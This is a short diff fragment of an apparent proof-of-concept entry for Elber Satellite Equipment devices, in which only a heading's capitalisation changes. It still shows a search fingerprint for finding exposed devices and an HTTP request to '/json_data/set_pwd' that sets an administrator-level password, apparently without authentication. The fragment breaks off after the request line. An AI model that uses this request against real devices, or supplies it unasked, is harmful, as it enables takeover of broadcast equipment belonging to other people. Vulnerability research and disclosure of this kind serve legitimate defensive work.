@@ -8,7 +8,7 @@
 title="Elber Satellite Equipment" || body="www.elber.it"
 ```
 
-## poc
+## POC
 
 ```javascript
 GET /json_data/set_pwd?lev=2&pass=admin1234 HTTP/1.1
